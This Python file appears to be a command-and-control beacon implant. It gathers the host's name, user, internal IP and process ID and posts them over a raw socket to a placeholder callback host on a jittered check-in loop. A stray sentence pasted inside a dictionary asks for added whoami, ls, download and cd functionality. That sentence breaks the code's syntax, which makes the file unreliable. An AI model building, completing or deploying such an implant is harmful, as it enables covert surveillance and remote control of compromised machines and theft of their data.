import os
import random
import time
import json
import socket
import getpass
import  json as json_lib

callback_host = "<CALLBACK_HOST>"
callback_port = "<CALLBACK_PORT>"
callback_path = "<CALLBACK_PATH>"
agent_watermark = "<WATERMARK>"

# Generate random 10-character hex agent ID at runtime
random.seed(int(time.time()) ^ os.getpid())
agent_id = f"{random.getrandbits(40):010x}"  # 40 bits = 10 hex digits

# Agent state
sleep_time = 5
jitter_percent = 10
current_directory = os.getcwd()
should_terminate = False

# Reusable JSON encoder
def encode_json(data):
    return json.dumps(data, ensure_ascii=False, sort_keys=True)

def get_init_data():
    # Hostname
    hostname = socket.gethostname()

    # Username
    try:
        username = getpass.getuser()
    except Exception:
        username = str(os.getuid())

    # Internal IP (by connecting to a public server)
    internal_ip = ''
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(('8.8.8.8', 53))  # Doesn't actually send data
        internal_ip = sock.getsockname()[0]
        sock.close()
    except Exception:
        internal_ip = ''

    return {Please synchronize everything and add full functionality including whoami, ls, download, and cd.
        "hostname": hostname,
        "username": username,
        "domain": "",  # Placeholder, same as Perl
        "internal_ip": internal_ip,
        "process": os.path.basename(__file__),  # Similar to $0
        "pid": os.getpid(),
        "sleep": sleep_time,
        "jitter": jitter_percent,
    }
def send_request(beat, init=None, results=None):
    print(f"[DEBUG] Connecting to {callback_host}:{callback_port}")
    try:
        # Create TCP socket
        sock = socket.create_connection((callback_host, callback_port), timeout=10)
        print("[DEBUG] Connected successfully")
    except Exception as e:
        print(f"[ERROR] Failed to connect: {e}")
        return None
    # Build request body
    body = {"beat": beat}
    if init:
        body["init"] = init
    if results and isinstance(results, list) and len(results) > 0:
        body["results"] = results

    body_json = encode_json(body)
    content_length = len(body_json.encode("utf-8"))

    print(f"[DEBUG] Beat: {beat}")
    print(f"[DEBUG] Body length: {content_length} bytes")
    print(f"[DEBUG] Body: {body_json}")
    print("[DEBUG] Sending request...")

    http_request = (
        f"POST {callback_path} HTTP/1.1\r\n"
        f"Host: {callback_host}:{callback_port}\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {content_length}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{body_json}"
    )

    try:
        sock.sendall(http_request.encode("utf-8"))

        # Read response
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
    except Exception as e:
        print(f"[ERROR] Failed during send/receive: {e}")
        return None

    response_text = response.decode("utf-8", errors="ignore")
    print(f"[DEBUG] Response length: {len(response_text)} bytes")
    print(f"[DEBUG] Response:\n{response_text}")

    parts = response_text.split("\r\n\r\n", 1)
    if len(parts) < 2:
        return None

    body_part = parts[1]
    try:
        data = json_lib.loads(body_part)
    except json_lib.JSONDecodeError as e:
        print(f"[ERROR] JSON decode failed: {e}")
        return None

    return data
def calculate_sleep():
    """Calculate sleep time with optional jitter."""
    if jitter_percent <= 0:
        return sleep_time
    jitter = int(sleep_time * jitter_percent / 100)
    return sleep_time + random.randint(0, jitter)


def main():
    beat = f"{agent_watermark}{agent_id}"
    init_data = get_init_data()
    first_checkin = True

    print("[INFO] Agent starting...")
    print(f"[INFO] Watermark: {agent_watermark}")
    print(f"[INFO] Agent ID: {agent_id}")
    print(f"[INFO] Beat: {beat}")
    print(f"[INFO] Callback: {callback_host}:{callback_port}{callback_path}")

    while not should_terminate:
        print(f"[INFO] Sending beacon (first_checkin={first_checkin})...")

        # Send beacon with init data only on first check-in
        response = send_request(beat, init_data if first_checkin else None, None)
        first_checkin = False

        sleep_duration = calculate_sleep()
        print(f"[DEBUG] Sleeping for {sleep_duration} seconds...")
        time.sleep(sleep_duration)


if __name__ == "__main__":
    main()
